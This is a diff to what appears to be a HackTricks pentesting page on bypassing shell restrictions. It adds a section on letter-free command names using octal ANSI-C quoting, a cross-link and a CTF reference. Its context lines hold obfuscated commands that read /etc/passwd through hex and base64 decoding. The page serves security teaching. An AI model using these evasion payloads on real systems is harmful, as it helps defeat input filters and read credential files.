@@ -6,6 +6,8 @@
 
 The command-injection and WAF-evasion collections in PayloadsAllTheThings, Bo0oM's cheat sheet, and the two linked Secjuice articles provide background for the shell-syntax variations in this section.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
+For identifying a shell sink and confirming blind execution, see [Command Injection](../../../pentesting-web/command-injection.md).
+
 ### Reverse Shell
 
 ```bash
@@ -133,11 +135,23 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
 `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
 cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+```
+
+### Letter-free command names with octal quoting
+
+Bash's ANSI-C `$'...'` quoting decodes octal escapes when constructing a command word.<sup>[[7]](#references)</sup>
+
+A letter-denylist can therefore fail if it still permits `$`, single quotes, backslashes, digits, and a command separator. This does not bypass input passed as a correctly quoted data argument.<sup>[[13]](#references)</sup>
+
+In this local test, `:` stands in for the preceding command and `\151\144` decodes to `id`.<sup>[[7]](#references)</sup> Arguments can be encoded as separate words when a word separator is available.<sup>[[13]](#references)</sup>
+
+```bash
+:;$'\151\144'
 ```
 
 ### Bypass IPs
@@ -368,6 +382,8 @@ Practical use cases in constrained embedded targets include:<sup>[[5]](#referenc
 
 > 🛠️  Combine this technique with ROP gadgets that call `system()` in a controlled lab; the cited router research demonstrates this combination on constrained hardware.<sup>[[5]](#references)</sup>
 
+
+
 ## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
@@ -382,5 +398,5 @@ Practical use cases in constrained embedded targets include:<sup>[[5]](#referenc
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
 - [11] [mount(8) — Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
-
+- [13] [Dojo CTF #36: Shell Escape writeup — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
 {{#include ../../../banners/hacktricks-training.md}}
